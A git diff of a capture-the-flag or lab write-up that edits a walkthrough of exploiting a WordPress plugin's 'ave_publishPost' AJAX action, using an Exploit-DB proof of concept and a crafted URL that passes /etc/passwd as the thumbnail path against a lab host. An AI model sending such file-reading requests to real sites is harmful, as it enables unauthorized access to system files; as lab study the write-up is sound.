@@ -1137,13 +1137,14 @@ cp /usr/share/exploitdb/exploits/php/webapps/39646.py .
 the PoC code in the exploit suggests that we can test the functionality with this url:
 http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
 
+
+the exploit produces a success of sort
+
 if we go to ```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd``` we should create a file upload with the contents of /etc/passwd.
 
 the exploit produces a success of sorts and a url.
 
-> TODO get outputs
-
-Following the url we get a 404. hmmmm so what happened? 
+Following the url above we get a 404. hmmmm so what happened? 
 
 lets take a closer look at the url parameters of the php page:
 /wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
@@ -1170,7 +1171,7 @@ looks like we are publishing a thumbnail picture via the ave_publishPost
 
 I try to find this method by running a grep for the method in extracted version of the backup code:
 
-```
+``` bash
 grep -rl "ave_publishPost" .
 ```
 
